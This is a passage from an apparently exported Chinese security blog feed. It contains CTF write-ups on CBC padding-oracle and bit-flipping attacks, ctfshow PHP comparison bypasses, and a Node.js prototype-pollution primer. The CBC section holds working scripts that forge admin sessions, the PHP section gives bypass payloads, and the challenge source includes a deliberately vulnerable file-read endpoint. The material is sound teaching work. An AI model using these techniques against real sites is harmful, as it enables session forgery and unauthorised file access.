class="line">        <span class="built_in">print</span>(<span class="string">&quot;500 incorrect padding!!!!&quot;</span>)</span><br><span class="line">    </span><br><span class="line">identify(ctext,key,iv)</span><br></pre></td></tr></table></figure>

<p><img   src="/../img/$%7Bfiilename%7D/image-20240909195137064.png"  alt="image-20240909195137064"></p>
<p>正确的密文，正确的解码，正确的识别</p>
<p>试想，我们不断改变iv会发生什么，我们将iv改为<code>0000000000000001</code></p>
<p><img   src="/../img/$%7Bfiilename%7D/image-20240909195727367.png"  alt="image-20240909195727367"></p>
<p>一切都变了，格式也不对，文本更不可能变了</p>
<p>我们接着变iv<code>0000000000000006</code></p>
<p><img   src="/../img/$%7Bfiilename%7D/image-20240909195826314.png"  alt="image-20240909195826314"></p>
<p>可以看到文本虽然不对，但是格式对了，所以返回了200</p>
<p>得到中间值（也就是明文加密后的最后一位）C &#x3D; 6 xor 1 &#x3D;7</p>
<p>而中间值在跟我们已知的iv的最后一位6进行xor就可以得到密文0x01</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line">c = <span class="built_in">ord</span>(<span class="string">&quot;1&quot;</span>) ^ <span class="built_in">ord</span>(<span class="string">&quot;6&quot;</span>)</span><br><span class="line">P = c ^ <span class="built_in">ord</span>(<span class="string">&quot;6&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">chr</span>(P))</span><br><span class="line"><span class="comment">#output : 1</span></span><br></pre></td></tr></table></figure>

<p>到这可能还不够清晰，因为我们最后一位本来就是0x01</p>
<p>如果不理解还可以继续往下看</p>
<p>iv&#x3D;<code>00000000000000^5</code></p>
<p><img   src="/../img/$%7Bfiilename%7D/image-20240909221449590.png"  alt="image-20240909221449590"></p>
<p>解出来乱文，但最后成功pad了，所以依然是200，按上面中间值不变的思路，我们推出倒数第二位正文</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">c = <span class="built_in">ord</span>(<span class="string">&quot;\x02&quot;</span>) ^ <span class="built_in">ord</span>(<span class="string">&quot;^&quot;</span>) </span><br><span class="line">d = c ^ <span class="built_in">ord</span>(<span class="string">&quot;5&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">chr</span>(d))</span><br><span class="line"><span class="comment">#output: i</span></span><br></pre></td></tr></table></figure>

<p>而后我们继续从500和200的响应中fuzz出,xxxxxxxxxxxxx\x03\x03\x03</p>
<p>按上面继续推出正文，如此反复直到推出所有正文</p>
<h3 id="改变值"><a href="#改变值" class="headerlink" title="改变值"></a>改变值</h3><p>根据CBC字节翻转的原理就可以控制iv的下一组值了，由此完成漏洞利用</p>
<h2 id="Fuzz脚本编写"><a href="#Fuzz脚本编写" class="headerlink" title="Fuzz脚本编写"></a>Fuzz脚本编写</h2><p>如果要无脑fuzz的话，16个字节，从\x00-\xFF，256个可能，时间复杂度爆表了，但我刚刚自己在试倒数第二个字节的fuzz的时候，感觉还是有规律可循的，应该是可以通过二分法来提升一下速度？毕竟算法还是一个门都没入的小白，脚本不可能自己写的了，这里贴贴大佬写的吧，有时间再来钻研钻研，感觉应该也不算难</p>
<p><a class="link"   href="https://github.com/AonCyberLabs/PadBuster" >https://github.com/AonCyberLabs/PadBuster<i class="fas fa-external-link-alt"></i></a></p>
<p><a class="link"   href="https://www.cnblogs.com/poziiey/p/12454625.html" >Padding Oracle攻击解密AES - poziiey - 博客园 (cnblogs.com)<i class="fas fa-external-link-alt"></i></a></p>
<h2 id="shiro721"><a href="#shiro721" class="headerlink" title="shiro721"></a>shiro721</h2><p>没想到shiro721的原理就是这个，知识连起来的感觉好爽啊，虽然知道了原理，但下次见到rememberme我也照样工具一把梭（</p>
<p>所以说其实Padding Oracle Attack最关键的条件还是错误的响应策略</p>
<p>那么在shiro框架中在哪犯了这个毛病呢</p>
<ul>
<li><p>padding失败，返回rememberMe&#x3D;deleteMe</p>
</li>
<li><p>padding成功，返回正常的响应数据</p>
</li>
</ul>
<p>简直一模一样，shiro721的源码，还有一些链或者无链的利用的分析还是单独在写一篇文章吧，再写在这过于冗杂了，安全的尽头是</p>
<p>脚本小子</p>
<p><a class="link"   href="https://github.com/SummerSec/ShiroAttack2" >SummerSec&#x2F;ShiroAttack2: shiro反序列化漏洞综合利用,包含（回显执行命令&#x2F;注入内存马）修复原版中NoCC的问题 https://github.com/j1anFen/shiro_attack<i class="fas fa-external-link-alt"></i></a></p>
<p><a class="link"   href="https://github.com/safe6Sec/ShiroExp" >safe6Sec&#x2F;ShiroExp: shiro综合利用工具 (github.com)<i class="fas fa-external-link-alt"></i></a></p>
<h1 id="相关例题"><a href="#相关例题" class="headerlink" title="相关例题"></a>相关例题</h1><h2 id="2024H-NCTF-flipPin"><a href="#2024H-NCTF-flipPin" class="headerlink" title="[2024H&amp;NCTF]flipPin"></a>[2024H&amp;NCTF]flipPin</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, abort</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">from</span> Crypto.Random <span class="keyword">import</span> get_random_bytes</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.Padding <span class="keyword">import</span> pad, unpad</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, Response</span><br><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> b64encode, b64decode</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line">default_session = <span class="string">&#x27;&#123;&quot;admin&quot;: 0, &quot;username&quot;: &quot;user1&quot;&#125;&#x27;</span></span><br><span class="line">key = get_random_bytes(AES.block_size)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encrypt</span>(<span class="params">session</span>):</span><br><span class="line">    iv = get_random_bytes(AES.block_size)</span><br><span class="line">    cipher = AES.new(key, AES.MODE_CBC, iv)</span><br><span class="line">    <span class="keyword">return</span> b64encode(iv + cipher.encrypt(pad(session.encode(<span class="string">&#x27;utf-8&#x27;</span>), AES.block_size)))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt</span>(<span class="params">session</span>):</span><br><span class="line">    raw = b64decode(session)</span><br><span class="line">    cipher = AES.new(key, AES.MODE_CBC, raw[:AES.block_size])</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        res = unpad(cipher.decrypt(raw[AES.block_size:]), AES.block_size).decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">        <span class="keyword">return</span> res</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(e)</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line">filename_blacklist = &#123;</span><br><span class="line">    <span class="string">&#x27;self&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;cgroup&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;mountinfo&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;env&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;flag&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    session = request.cookies.get(<span class="string">&#x27;session&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> session <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        res = Response(</span><br><span class="line">            <span class="string">&quot;welcome to the FlipPIN server try request /hint to get the hint&quot;</span>)</span><br><span class="line">        res.set_cookie(<span class="string">&#x27;session&#x27;</span>, encrypt(default_session).decode())</span><br><span class="line">        <span class="keyword">return</span> res</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;have a fun&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/hint&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hint</span>():</span><br><span class="line">    res = Response(<span class="built_in">open</span>(__file__).read(), mimetype=<span class="string">&#x27;text/plain&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/read&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">file</span>():</span><br><span class="line"></span><br><span class="line">    session = request.cookies.get(<span class="string">&#x27;session&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> session <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        res = Response(<span class="string">&quot;you are not logged in&quot;</span>)</span><br><span class="line">        res.set_cookie(<span class="string">&#x27;session&#x27;</span>, encrypt(default_session))</span><br><span class="line">        <span class="keyword">return</span> res</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        plain_session = decrypt(session)</span><br><span class="line">        <span class="keyword">if</span> plain_session <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;don\&#x27;t hack me&#x27;</span></span><br><span class="line"></span><br><span class="line">        session_data = json.loads(plain_session)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> session_data[<span class="string">&#x27;admin&#x27;</span>] :</span><br><span class="line">            filename = request.args.get(<span class="string">&#x27;filename&#x27;</span>)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">any</span>(blacklist_str <span class="keyword">in</span> filename <span class="keyword">for</span> blacklist_str <span class="keyword">in</span> filename_blacklist):</span><br><span class="line">                abort(<span class="number">403</span>, description=<span class="string">&#x27;Access to this file is forbidden.&#x27;</span>)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                <span class="keyword">with</span> <span class="built_in">open</span>(filename, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">                    <span class="keyword">return</span> f.read()</span><br><span class="line">            <span class="keyword">except</span> FileNotFoundError:</span><br><span class="line">                abort(<span class="number">404</span>, description=<span class="string">&#x27;File not found.&#x27;</span>)</span><br><span class="line">            <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">                abort(<span class="number">500</span>, description=<span class="string">f&#x27;An error occurred: <span class="subst">&#123;<span class="built_in">str</span>(e)&#125;</span>&#x27;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;You are not an administrator&#x27;</span></span><br><span class="line">            </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run(host=<span class="string">&quot;0.0.0.0&quot;</span>, port=<span class="number">9091</span>, debug=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure>

<p>目标：把session中的admin改为1，接着可以任意文件读取来计算pin码（后面忽略了因为和cbc无关）</p>
<p>代码逻辑：给普通用户下发一个密文session，是由明文<code>&#123;&quot;admin&quot;: 0, &quot;username&quot;: &quot;user1&quot;&#125;</code>通过<code>encrypt()</code>加密得来的，最后再从咱的session中<code>decrypt</code>后判断admin的值</p>
<p>漏洞分析：可控值为session，因为这里session如果已经发送就不会再改变而且session中包含<code>iv</code>，也就是说第一组的<code>iv</code>可控，而admin的属性值刚好就在第二组，所以可以实现无痛改值</p>
<p>编写exp：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">from</span> Crypto.Random <span class="keyword">import</span> get_random_bytes</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.Padding <span class="keyword">import</span> pad, unpad</span><br><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> b64encode, b64decode</span><br><span class="line"></span><br><span class="line">default_session = <span class="string">&#x27;&#123;&quot;admin&quot;: 0, &quot;username&quot;: &quot;user1&quot;&#125;&#x27;</span></span><br><span class="line">key = <span class="string">&quot;you_need_16_char&quot;</span>.encode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encrypt</span>(<span class="params">session</span>):</span><br><span class="line">    iv = get_random_bytes(AES.block_size)</span><br><span class="line">    cipher = AES.new(key, AES.MODE_CBC, iv)</span><br><span class="line">    <span class="keyword">return</span> b64encode(iv + cipher.encrypt(pad(session.encode(<span class="string">&#x27;utf-8&#x27;</span>), AES.block_size)))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt</span>(<span class="params">session</span>):</span><br><span class="line">    raw = b64decode(session)</span><br><span class="line">    cipher = AES.new(key, AES.MODE_CBC, raw[:AES.block_size])</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        res = unpad(cipher.decrypt(raw[AES.block_size:]), AES.block_size)</span><br><span class="line">        <span class="keyword">return</span> res</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(e)</span><br><span class="line"></span><br><span class="line"><span class="comment">#从抓包得来的session</span></span><br><span class="line">Original_session = <span class="string">&quot;hEQ/vgfpFdYmWvsTv5Kmj6x0TOXzLf/GjxVq88WPCq3hqgexPxFZc1ALch6BX4eKYgovZIyNiyRNHs2Rg8ApJg==&quot;</span></span><br><span class="line">byte_session = <span class="built_in">list</span>((b64decode(Original_session.encode())))</span><br><span class="line">byte_session[default_session.index(<span class="string">&#x27;0&#x27;</span>)]^= <span class="number">1</span> <span class="comment">#省略0，任何数和0异或都等于原本</span></span><br><span class="line">Altered_session = <span class="built_in">bytes</span>(byte_session)</span><br><span class="line"><span class="built_in">print</span>(decrypt(b64encode(Altered_session)))</span><br></pre></td></tr></table></figure>

<p>发现最终解密出来的admin就是1</p>
<p><img   src="/../img/$%7Bfiilename%7D/image-20240904114449128.png"  alt="image-20240904114449128"></p>
<h2 id="NewStarCTF-公开赛赛道-flip-flop"><a href="#NewStarCTF-公开赛赛道-flip-flop" class="headerlink" title="[NewStarCTF 公开赛赛道]flip-flop"></a>[NewStarCTF 公开赛赛道]flip-flop</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> FLAG</span><br><span class="line">auth_major_key = os.urandom(<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">BANNER = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">Login as admin to get the flag ! </span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">MENU = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">Enter your choice</span></span><br><span class="line"><span class="string">[1] Create NewStarCTF Account</span></span><br><span class="line"><span class="string">[2] Create Admin Account</span></span><br><span class="line"><span class="string">[3] Login</span></span><br><span class="line"><span class="string">[4] Exit</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(BANNER)</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="built_in">print</span>(MENU)</span><br><span class="line"></span><br><span class="line">    option = <span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&#x27;&gt; &#x27;</span>))</span><br><span class="line">    <span class="keyword">if</span> option == <span class="number">1</span>:</span><br><span class="line">        auth_pt = <span class="string">b&#x27;NewStarCTFer____&#x27;</span></span><br><span class="line">        user_key = os.urandom(<span class="number">16</span>)</span><br><span class="line">        cipher = AES.new(auth_major_key, AES.MODE_CBC, user_key)</span><br><span class="line">        code = cipher.encrypt(auth_pt)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&#x27;here is your authcode: <span class="subst">&#123;user_key.<span class="built_in">hex</span>() + code.<span class="built_in">hex</span>()&#125;</span>&#x27;</span>)</span><br><span class="line">    <span class="keyword">elif</span> option == <span class="number">2</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;GET OUT !!!!!!&#x27;</span>)</span><br><span class="line">    <span class="keyword">elif</span> option == <span class="number">3</span>:</span><br><span class="line">        authcode = <span class="built_in">input</span>(<span class="string">&#x27;Enter your authcode &gt; &#x27;</span>)</span><br><span class="line">        user_key = <span class="built_in">bytes</span>.fromhex(authcode)[:<span class="number">16</span>]</span><br><span class="line">        code = <span class="built_in">bytes</span>.fromhex(authcode)[<span class="number">16</span>:]</span><br><span class="line">        cipher = AES.new(auth_major_key, AES.MODE_CBC, user_key)</span><br><span class="line">        auth_pt = cipher.decrypt(code)</span><br><span class="line">        <span class="keyword">if</span> auth_pt == <span class="string">b&#x27;AdminAdmin______&#x27;</span>:</span><br><span class="line">            <span class="built_in">print</span>(FLAG)</span><br><span class="line">        <span class="keyword">elif</span> auth_pt == <span class="string">b&#x27;NewStarCTFer____&#x27;</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;Have fun!!&#x27;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;Who are you?&#x27;</span>)</span><br><span class="line">    <span class="keyword">elif</span> option == <span class="number">4</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;ByeBye&#x27;</span>)</span><br><span class="line">        exit(<span class="number">0</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;WTF&quot;</span>)</span><br></pre></td></tr></table></figure>

<p>nc题，给源码，知道上面原理之后其实感觉就是小卡拉密题，直接搓脚本吧</p>
<p>把<code>NewStarCTFer____</code>换成<code>AdminAdmin______</code>即可，用的hex编的码,都是16字节我哭死</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">htext = <span class="string">&quot;0dfe11dbee2a5100dba9bd441e2ca60cab26029c054ee566fd21b0ea1dcc9016&quot;</span></span><br><span class="line">btext = <span class="built_in">bytes</span>.fromhex(htext)</span><br><span class="line">iv = btext[:<span class="number">16</span>]</span><br><span class="line">ctext = btext[<span class="number">16</span>:]</span><br><span class="line">otext = <span class="string">&quot;NewStarCTFer____&quot;</span></span><br><span class="line">etext = <span class="string">&quot;AdminAdmin______&quot;</span></span><br><span class="line">res = []</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i,j,k <span class="keyword">in</span> <span class="built_in">zip</span> (iv,otext,etext):</span><br><span class="line">    res.append(i ^ <span class="built_in">ord</span>(j) ^ <span class="built_in">ord</span>(k))</span><br><span class="line"></span><br><span class="line">payload = <span class="built_in">bytes</span>(res).<span class="built_in">hex</span>()+ctext.<span class="built_in">hex</span>()</span><br><span class="line"><span class="built_in">print</span>(payload)</span><br></pre></td></tr></table></figure>

<p><img   src="/../img/$%7Bfiilename%7D/image-20240910101010281.png"  alt="image-20240910101010281"></p>
<h2 id="2016-hack-lu-ctf-cryptolocker-CBC-Padding-Oracle-Attack"><a href="#2016-hack-lu-ctf-cryptolocker-CBC-Padding-Oracle-Attack" class="headerlink" title="2016 hack.lu-ctf cryptolocker CBC Padding Oracle Attack"></a>2016 hack.lu-ctf cryptolocker CBC Padding Oracle Attack</h2><h2 id="NPUCTF-web🐕"><a href="#NPUCTF-web🐕" class="headerlink" title="NPUCTF web🐕"></a>NPUCTF web🐕</h2><p>放两题 padding oracle attack的，没打，我是懒🐕</p>
]]></content>
      <categories>
        <category>技术探索</category>
        <category>漏洞复现</category>
      </categories>
      <tags>
        <tag>ctf</tag>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title>PHP特性ctfshow</title>
    <url>/2024/03/02/PHP%E7%89%B9%E6%80%A7ctfshow/</url>
    <content><![CDATA[<h1 id="CTFSHOW"><a href="#CTFSHOW" class="headerlink" title="CTFSHOW"></a>CTFSHOW</h1><span id="more"></span>

<h1 id="web89"><a href="#web89" class="headerlink" title="web89"></a>web89</h1><p><img   src="/../img/$%7Bfiilename%7D/image-20240302112347828.png"  alt="image-20240302112347828"></p>
<p><code>intval()</code>获取变量的整数值，如果是变量是数组的话，要看数组里面有没有元素，有元素返回1，没有元素返回0，这里传入一个有元素的数组即可</p>
<h1 id="web90"><a href="#web90" class="headerlink" title="web90"></a>web90</h1><p><img   src="/../img/$%7Bfiilename%7D/image-20240302113937890.png"  alt="image-20240302113937890"></p>
<p><code>intval()</code>的第二个参数是用来识别前一个参数是什么进制，如果为0，就是自动检测，0x开头的会被识别为16进制，0开头会被识别为8进制，否则，将使用10进制，这里第二个参数默认为10，就是按十进制识别</p>
<p>所以把4476转为16进制，在开头加入0x传入即可</p>
<h1 id="web91"><a href="#web91" class="headerlink" title="web91"></a>web91</h1><p><img   src="/../img/$%7Bfiilename%7D/image-20240302125706558.png"  alt="image-20240302125706558"></p>
<p>先看这里两个正则&#x2F;^php$&#x2F;im,&#x2F;^php$&#x2F;i</p>
<p>i:不区分大小写匹配</p>
<p>m:以每行为一个单位匹配</p>
<p>^:匹配单位的开头</p>
<p>$:匹配单位的末尾</p>
<p>这题要求我们既要满足第一个正则，又不满足第二个正则，而两个的区别在于m，多行匹配与否的问题</p>
<p>这里的^xxx$意思说要匹配的单位只能是xxx，不要什么都匹配不到</p>
<p>那么我们只要在第二行有php，第一行没有，就满足了</p>
<p><strong>payload:%0aphp</strong></p>
<p>%0a是url编码的换行符</p>
<h1 id="web92"><a href="#web92" class="headerlink" title="web92"></a>web92</h1><p><img   src="/../img/$%7Bfiilename%7D/image-20240302130355748.png"  alt="image-20240302130355748"></p>
<p>可以传入4476e1,弱比较时也不会把它转化为4476，因为e一般表示科学计数法，它转化为什么就不知道了,但是intval却可以转化为4476</p>
<p><img   src="/../img/$%7Bfiilename%7D/image-20240302140721408.png"  alt="image-20240302140721408"></p>
<p>这里hint是错的，验证过了，其他字母会被弱等于转化然后输出nonono</p>
<h1 id="web93"><a href="#web93" class="headerlink" title="web93"></a>web93</h1><p><img   src="/../img/$%7Bfiilename%7D/image-20240302132556869.png"  alt="image-20240302132556869"></p>
<p>上面说了0开头会以八进制识别</p>
<h1 id="web94"><a href="#web94" class="headerlink" title="web94"></a>web94</h1><p><img   src="/../img/$%7Bfiilename%7D/image-20240302134509330.png"  alt="image-20240302134509330"></p>
<p>要想输出flag，有三个条件</p>
<p>1.num不能强等于4476</p>
<p>2.num中不能有字母</p>
<p>3.num的开头不能是0(<code>strpos()</code>会返回0第一次出现的位置，从0开始)</p>
<p>第一种方法:</p>
<p>绕过<code>strpos()</code>传入+010574,其中+不能在url中直接输入，会被解析为空格,要输入%2B010574</p>
<p>第二种方法:</p>
<p>绕过强等于，直接传入4476.0，强度于两边数据类型不同直接返回false</p>
<h1 id="web95"><a href="#web95" class="headerlink" title="web95"></a>web95</h1><p><img   src="/../img/$%7Bfiilename%7D/image-20240302135645125.png"  alt="image-20240302135645125"></p>
<p>弱等于，用以上第一种方法</p>
<h1 id="web96"><a href="#web96" class="headerlink" title="web96"></a>web96</h1><p><img   src="/../img/$%7Bfiilename%7D/image-20240302141223598.png"  alt="image-20240302141223598"></p>
<p>传入.&#x2F;flag.php即可</p>
<h1 id="web97"><a href="#web97" class="headerlink" title="web97"></a>web97</h1><p><img   src="/../img/$%7Bfiilename%7D/image-20240302201703858.png"  alt="image-20240302201703858"></p>
<p>强度于，数组绕过</p>
<p><code>md5()</code>被传入一个数组时，会返回null，于是我们传入两个数组，结果就是null&#x3D;&#x3D;&#x3D;null,即可绕过</p>
<p>payload:a[]&#x3D;1&amp;b[]&#x3D;2</p>
<h1 id="web98"><a href="#web98" class="headerlink" title="web98"></a>web98</h1><p>到这先，先去学别的大类漏洞吧</p>
]]></content>
      <categories>
        <category>Write up</category>
      </categories>
      <tags>
        <tag>ctf</tag>
        <tag>php</tag>
      </tags>
  </entry>
  <entry>
    <title>Node.Js原型链污染的利用汇总</title>
    <url>/2024/07/11/Node-Js%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93%E7%9A%84%E5%88%A9%E7%94%A8%E4%B8%8E%E6%8C%96%E6%8E%98/</url>
    <content><![CDATA[<p>.</p>
<span id="more"></span>

<h1 id="基本原理"><a href="#基本原理" class="headerlink" title="基本原理"></a>基本原理</h1><p><img   src="/../img/$%7Bfiilename%7D/image.png"  alt="image"></p>
<p>Nodejs中一切皆对象，函数是对象，每个对象都有对应的构造函数和原型对象</p>
<p><strong>prototype</strong>指向的是原型对象</p>
<p><strong>__proto__</strong> 指向的是构造函数的原型对象</p>
<p>当nodejs要在对象找到一个函数或者一个变量时，如果找不到，则向这个对象的构造函数的原型对象去寻找</p>
<p>如此反复</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">a</span>(<span class="params"></span>)&#123;</span><br><span class="line">    ewo = <span class="string">&quot;ji&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(a.<span class="property">constructor</span>)<span class="comment">//[Function: Function]，函数a的构造函数是Function</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(a.<span class="property">__proto__</span> == <span class="title class_">Function</span>.<span class="property"><span class="keyword">prototype</span></span>) <span class="comment">//true</span></span><br><span class="line"></span><br><span class="line">a.<span class="property">__proto__</span>.<span class="property">ewoji</span> = <span class="number">123</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title class_">Function</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">ewoji</span>)  <span class="comment">//123</span></span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(a.<span class="property">ewoji</span>)  <span class="comment">//123，a中没有ewoji，向a.__proto__寻找</span></span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title class_">Function</span>.<span class="property">ewoji</span>)  <span class="comment">//123,and why?</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title class_">Function</span>.<span class="property"><span class="keyword">prototype</span></span> == <span class="title class_">Function</span>.<span class="property">__proto__</span>)  <span class="comment">//true,因为内置对象的构造函数就是自己</span></span><br></pre></td></tr></table></figure>

<h1 id="利用过程"><a href="#利用过程" class="headerlink" title="利用过程"></a>利用过程</h1><p>以一个**merge()**函数为例（用于合并两个对象的方法）</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">merge</span>(<span class="params">paste,data</span>)&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">let</span> key <span class="keyword">in</span> data)<span class="comment">//此处的key即获得对象的键值</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(key <span class="keyword">in</span> paste &amp;&amp; key <span class="keyword">in</span> data)&#123;</span><br><span class="line">            <span class="title function_">merge</span>(paste[key],data[key])</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">           paste[key] = data[key]</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>漏洞的第一条件是我们可以控制传入的对象</strong></p>
<p>假设这里的data对象是可以控制的，那我们将带有__proto__键值的data对象通过merge()函数传给paste即可完成污染</p>
<p><strong>一个误区</strong>：</p>
<p>可能会有这样的疑问，既然我都可以控制对象了，那我直接从这个对象污染不就好了，为什么还要通过这个对象传给另一个对象再污染</p>
<p>其中的原理我也没搞清楚，只做了一个证明实验</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> data = &#123;</span><br><span class="line">    d : <span class="number">1</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> b = <span class="title class_">JSON</span>.<span class="title function_">parse</span>(<span class="string">&#x27;&#123;&quot;a&quot;:&quot;test&quot;,&quot;__proto__&quot;:&#123;&quot;ewoji&quot;:&quot;xixixi&quot;&#125;&#125;&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(b.<span class="property">__proto__</span> == <span class="title class_">Object</span>.<span class="property"><span class="keyword">prototype</span></span>) <span class="comment">//false</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(data.<span class="property">__proto__</span> == <span class="title class_">Object</span>.<span class="property"><span class="keyword">prototype</span></span>)<span class="comment">//true</span></span><br></pre></td></tr></table></figure>

<p>这个实验证明了，通过**JSON.parse()**创建的对象的构造函数的原型对象并不是Object.prototype所以并不能污染Object</p>
<p>于是我们将带有污染的且可控的对象传给通过**merge()**传给另一个对象即可完成污染</p>
